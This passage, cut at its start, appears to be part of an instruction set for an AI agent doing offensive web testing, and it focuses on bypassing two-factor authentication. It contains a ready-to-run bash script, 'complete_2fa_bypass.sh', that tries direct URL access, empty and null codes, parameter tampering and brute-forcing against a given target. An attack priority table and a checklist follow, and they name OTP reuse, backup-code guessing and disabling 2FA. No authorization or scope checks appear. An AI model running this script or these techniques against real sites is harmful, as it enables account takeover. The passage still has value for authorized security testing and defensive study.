â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# "Remember this device" feature

# Check how device is identified
curl -s -D - "https://target.com/login" | grep -i "cookie\|token"

# Try copying device token
# Check if device ID is predictable

# Test if "remember device" can be set without completing 2FA
curl -s -X POST "https://target.com/verify" \
    -d "code=000000&remember_device=true"

================================================================================
PHASE 8: COMPLETE 2FA BYPASS SCRIPT
================================================================================

#!/bin/bash
# complete_2fa_bypass.sh

TARGET="$1"
LOGIN_URL="${TARGET}/login"
VERIFY_URL="${TARGET}/verify"
PROTECTED_URL="${TARGET}/dashboard"
USERNAME="$2"
PASSWORD="$3"

OUTPUT_DIR="outputs/2fa_bypass"
mkdir -p "$OUTPUT_DIR"

echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
echo " Complete 2FA Bypass Test - $TARGET"
echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"

# Login to get pre-2FA session
curl -s -c "$OUTPUT_DIR/session.txt" -X POST "$LOGIN_URL" \
    -d "username=$USERNAME&password=$PASSWORD" > /dev/null

# TEST 1: Direct Access Bypass
echo ""
echo "[TEST 1] Direct Access Bypass"
echo "â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€"
response=$(curl -s -b "$OUTPUT_DIR/session.txt" "$PROTECTED_URL")
if echo "$response" | grep -qi "dashboard\|welcome\|$USERNAME"; then
    echo "[!] CRITICAL: 2FA can be bypassed by direct URL access!"
    echo "BYPASS: Direct access to protected URL" >> "$OUTPUT_DIR/bypass_results.txt"
else
    echo "[+] Direct access blocked"
fi

# TEST 2: Null/Empty Code
echo ""
echo "[TEST 2] Null/Empty Code"
echo "â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€"
for code in "" "null" "0" "000000"; do
    response=$(curl -s -b "$OUTPUT_DIR/session.txt" -X POST "$VERIFY_URL" \
        -d "code=$code")
    if echo "$response" | grep -qi "success\|verified\|welcome"; then
        echo "[!] BYPASS with code='$code'"
        echo "BYPASS: Null/empty code ($code)" >> "$OUTPUT_DIR/bypass_results.txt"
        break
    fi
done

# TEST 3: Parameter Manipulation
echo ""
echo "[TEST 3] Parameter Manipulation"
echo "â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€"
params=("verified=true" "success=1" "skip=1" "bypass=1")
for param in "${params[@]}"; do
    response=$(curl -s -b "$OUTPUT_DIR/session.txt" -X POST "$VERIFY_URL" \
        -d "code=123456&$param")
    if echo "$response" | grep -qi "success\|verified\|welcome"; then
        echo "[!] BYPASS with param: $param"
        echo "BYPASS: Parameter manipulation ($param)" >> "$OUTPUT_DIR/bypass_results.txt"
    fi
done

# TEST 4: Rate Limiting Check
echo ""
echo "[TEST 4] Rate Limiting Check"
echo "â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€"
locked=0
for i in {1..30}; do
    response=$(curl -s -b "$OUTPUT_DIR/session.txt" -X POST "$VERIFY_URL" \
        -d "code=$((RANDOM % 1000000))")
    if echo "$response" | grep -qi "rate\|limit\|locked\|too many\|wait"; then
        echo "[+] Rate limiting active after $i attempts"
        echo "Rate limit: Active after $i attempts" >> "$OUTPUT_DIR/rate_limit_bypass.txt"
        locked=1
        break
    fi
done
if [ $locked -eq 0 ]; then
    echo "[!] No rate limiting detected after 30 attempts!"
    echo "VULNERABLE: No rate limiting on 2FA" >> "$OUTPUT_DIR/rate_limit_bypass.txt"
fi

echo ""
echo "[*] Tests complete. Results in $OUTPUT_DIR"

================================================================================
ğŸ§  YOU ARE AN INTELLIGENT AGENT ğŸ§ 
================================================================================

ATTACK PRIORITY:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Priority â”‚ Attack                      â”‚ Impact                            â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ 1        â”‚ Direct Access Bypass        â”‚ Complete 2FA bypass               â”‚
â”‚ 2        â”‚ Null/Empty Code             â”‚ Complete bypass                   â”‚
â”‚ 3        â”‚ Response Manipulation       â”‚ Client-side bypass                â”‚
â”‚ 4        â”‚ No Rate Limiting            â”‚ Enables brute-force               â”‚
â”‚ 5        â”‚ Token Reuse                 â”‚ Replay attacks                    â”‚
â”‚ 6        â”‚ Backup Code Weakness        â”‚ Alternative bypass path           â”‚
â”‚ 7        â”‚ 2FA Removal Without Auth    â”‚ Persistent bypass                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

VERIFICATION CHECKLIST:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
â–¡ Can protected pages be accessed without completing 2FA?
â–¡ Does null/empty code bypass verification?
â–¡ Is there rate limiting on OTP attempts?
â–¡ Can the same OTP be reused?
â–¡ Can 2FA be disabled without verification?
â–¡ Are backup codes predictable or brute-forceable?

================================================================================
COMMON MISTAKES TO AVOID
================================================================================
âŒ Only testing the main 2FA endpoint, missing API/mobile versions
âŒ Not testing backup/recovery flows
âŒ Forgetting to test 2FA enrollment/removal
âŒ Missing rate limit bypass techniques
âŒ Not testing OTP reuse across sessions

================================================================================
SUCCESS CRITERIA
================================================================================
âœ“ All 2FA mechanisms identified
âœ“ Direct access bypass tested
âœ“ Null/empty/parameter manipulation tested
âœ“ Rate limiting evaluated with bypass attempts
âœ“ Token reuse and timing attacks tested
âœ“ Backup/recovery paths evaluated
âœ“ 2FA enrollment/removal security tested

